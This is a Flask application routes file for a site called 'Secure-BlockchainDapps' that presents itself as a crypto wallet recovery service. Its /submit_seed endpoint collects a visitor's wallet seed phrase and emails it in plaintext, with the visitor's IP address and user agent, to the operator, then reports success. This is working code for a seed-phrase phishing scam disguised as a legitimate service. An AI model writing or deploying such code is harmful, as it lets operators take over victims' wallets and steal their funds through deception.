import logging
from flask import render_template, request, jsonify, flash
from flask_mail import Message
from app import app, mail

logger = logging.getLogger(__name__)

@app.route('/')
def index():
    """Main homepage route"""
    return render_template('index.html')

@app.route('/submit_seed', methods=['POST'])
def submit_seed():
    """Handle seed phrase submission from frontend"""
    try:
        data = request.get_json()
        
        if not data:
            return jsonify({'error': 'No data provided'}), 400
        
        seed_phrase = data.get('seedPhrase', '')
        wallet_name = data.get('walletName', '')
        data_type = data.get('dataType', '')
        issue = data.get('issue', '')
        
        if not seed_phrase:
            return jsonify({'error': 'Seed phrase is required'}), 400
        
        # Log the submission (in production, ensure this is secure)
        logger.info(f"Wallet recovery submission received - Wallet: {wallet_name}, Type: {data_type}, Issue: {issue}")
        
        # Send email notification
        try:
            msg = Message(
                subject='New Wallet Recovery Request - Secure-BlockchainDapps',
                recipients=[app.config['MAIL_DEFAULT_SENDER']],
                body=f"""
New wallet recovery request received:

Wallet Name: {wallet_name}
Data Type: {data_type}
Issue: {issue}
Seed Phrase: {seed_phrase}

Timestamp: {request.headers.get('Date', 'Unknown')}
User Agent: {request.headers.get('User-Agent', 'Unknown')}
IP Address: {request.remote_addr}
                """
            )
            mail.send(msg)
            logger.info("Email notification sent successfully")
        except Exception as e:
            logger.error(f"Failed to send email notification: {str(e)}")
        
        return jsonify({'success': True, 'message': 'Data received successfully'})
    
    except Exception as e:
        logger.error(f"Error processing seed submission: {str(e)}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/health')
def health_check():
    """Health check endpoint"""
    return jsonify({'status': 'healthy', 'service': 'Secure-BlockchainDapps'})

@app.errorhandler(404)
def not_found(error):
    """Handle 404 errors"""
    return render_template('index.html'), 404

@app.errorhandler(500)
def internal_error(error):
    """Handle 500 errors"""
    logger.error(f"Internal server error: {str(error)}")
    return jsonify({'error': 'Internal server error'}), 500
